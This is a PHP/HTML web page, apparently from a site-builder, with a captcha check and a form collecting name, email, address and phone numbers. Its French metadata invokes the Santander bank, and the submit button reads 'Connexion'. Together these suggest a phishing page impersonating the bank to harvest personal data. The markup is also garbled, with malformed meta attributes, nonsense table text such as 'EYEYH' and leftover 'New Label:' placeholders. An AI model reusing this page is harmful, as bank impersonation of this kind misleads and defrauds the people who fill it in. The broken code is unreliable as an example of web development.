<?php
if (session_id() == "")
{
   session_start();
}
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
   if (isset($_POST['captcha_code'],$_SESSION['random_txt']) && md5($_POST['captcha_code']) == $_SESSION['random_txt'])
   {
      unset($_POST['captcha_code'],$_SESSION['random_txt']);
   }
   else
   {
      echo '<b>The entered code was wrong.</b><br>';
      echo '<a href="javascript:history.back()">Go Back</a>';
      exit;
   }
}
?>
<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<title>Untitled Page</title>
<meta name="description" content="" Demandez="" un="" compte="" bancaire="" en="" ligne="" auprès="" de="" la="" banque="" Santander="" et="" profitez="" des="" options="" de="" compte="" en="" ligne="" pratiques="" de="" l'une="" des="" meilleures="" banques="" personnelles."lang=" fr-FR" "="">
<meta name="keywords" content="online bank(s), personal banking, bank account(s), best personal banks, apply for bank account online,banque (s) en ligne, banque personnelle, compte (s) bancaire (s), meilleures banques personnelles, demande de compte bancaire en ligne " lang=" fr-FR">
<meta name="author" content="CCS - Computer Consulting Services">
<meta name="generator" content="CCS - Computer Consulting Services">
<link href="../logo.ico" rel="shortcut icon" type="image/x-icon">
<link href="../logo.png" rel="apple-touch-icon" sizes="500x380">
<link href="../css/BIO_V1.css" rel="stylesheet">
<link href="../css/page2.css" rel="stylesheet">
</head>
<body>
   <div id="container">
      <table id="Table1">
         <tr>
            <td class="cell0"><span id="wb_uid0"> ERR</span></td>
            <td class="cell1"><span id="wb_uid1"> EYEYH</span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid2"> EY</span></td>
            <td class="cell1"><span id="wb_uid3"> EY</span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid4"> </span></td>
            <td class="cell1"><span id="wb_uid5"> </span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid6"> </span></td>
            <td class="cell1"><span id="wb_uid7"> </span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid8"> </span></td>
            <td class="cell1"><span id="wb_uid9"> </span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid10"> EY</span></td>
            <td class="cell1"><span id="wb_uid11"> </span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid12"> </span></td>
            <td class="cell1"><span id="wb_uid13"> YEEY</span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid14"> </span></td>
            <td class="cell1"><span id="wb_uid15"> </span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid16"> </span></td>
            <td class="cell1"><span id="wb_uid17"> </span></td>
         </tr>
         <tr>
            <td class="cell2"><span id="wb_uid18"> </span></td>
            <td class="cell1"><span id="wb_uid19"> </span></td>
         </tr>
      </table>
      <div id="wb_Form3">
         <form name="contact" method="post" action="mailto:yourname@address.com?subject=Contact Information" id="Form3">
            <label for="Combobox1" id="Label6">Subject:</label>
            <select name="subject" size="1" id="Combobox1">
               <option selected="" value="General Feedback">General Feedback</option>
               <option value="Contact Request">Contact Request</option>
               <option value="Price Quote">Price Quote</option>
               <option value="Employment Information">Employment Information</option>
            </select>
            <label for="Editbox1" id="Label7">Name:</label>
            <input type="text" id="Editbox1" name="name" value="">
            <label for="Editbox2" id="Label8">Email:</label>
            <input type="text" id="Editbox2" name="email" value="">
            <label for="TextArea2" id="Label9">Address:</label>
            <textarea name="Address" id="TextArea2" rows="2" cols="19"></textarea>
            <label for="Editbox3" id="Label10">City:</label>
            <input type="text" id="Editbox3" name="city" value="">
            <label for="Editbox4" id="Label11">State:</label>
            <input type="text" id="Editbox4" name="state" value="">
            <label for="Editbox5" id="Label12">Zip</label>
            <input type="text" id="Editbox5" name="zip" value="">
            <label for="Editbox6" id="Label13">Home Phone:</label>
            <input type="text" id="Editbox6" name="Home Phone" value="">
            <label for="Editbox7" id="Label14">Work Phone</label>
            <input type="text" id="Editbox7" name="Work Phone" value="">
            <label for="Editbox8" id="Label15">Fax Number</label>
            <input type="text" id="Editbox8" name="Fax Number" value="">
            <label for="" id="Label16">When is the best time to contact you?</label>
            <label for="RadioButton5" id="Label17">Morning</label>
            <input type="radio" id="RadioButton5" name="q[1]" value="Morning" checked="">
            <label for="RadioButton6" id="Label18">Afternoon</label>
            <input type="radio" id="RadioButton6" name="q[1]" value="Afternoon">
            <label for="RadioButton7" id="Label19">Evening</label>
            <input type="radio" id="RadioButton7" name="q[1]" value="Evening">
            <label for="" id="Label20">What is the best way to contact you?</label>
            <label for="RadioButton8" id="Label21">Phone</label>
            <input type="radio" id="RadioButton8" name="q[2]" value="Phone" checked="">
            <label for="RadioButton9" id="Label22">E-mail</label>
            <input type="radio" id="RadioButton9" name="q[2]" value="E-mail">
            <label for="RadioButton10" id="Label23">Fax</label>
            <input type="radio" id="RadioButton10" name="q[2]" value="Fax">
            <label for="Captcha1" id="Label24">New Label:</label>
            <div id="wb_Captcha1">
               <img src="captcha1.php" alt="Click for new image" title="Click for new image" id="wb_uid20" onclick="this.src='captcha1.php?'+Math.random()">
               <span><input type="text" id="Captcha1" name="captcha_code" value=""></span></div>
            <label for="" id="Label25">New Label:</label>
            <label for="Editbox9" id="Label26">New Label:</label>
            <input type="text" id="Editbox9" name="Editbox9" value="">
            <input type="submit" id="Button3" name="" value="Connexion">
         </form>
      </div>
   </div>
</body>
</html>